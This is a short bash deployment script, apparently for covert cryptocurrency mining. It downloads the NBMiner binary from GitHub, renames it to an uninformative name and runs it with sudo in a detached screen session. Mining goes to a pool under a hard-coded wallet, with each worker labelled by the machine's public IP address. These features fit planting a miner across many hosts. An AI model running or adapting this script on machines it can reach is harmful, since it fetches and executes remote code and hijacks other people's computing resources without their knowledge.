#!/bin/bash

WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
PAL=stratum+tcp://us-eth.2miners.com:2020
WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
COMA="-a ethash -o $PAL -u $WELS.$WER"



FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    apt install screen -y
    wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz
    tar zxvf NBMiner_40.1_Linux.tgz
    cd NBMiner_Linux
    mv nbminer a
    chmod +x *
fi
screen -dmLS mine sudo ./a $COMA
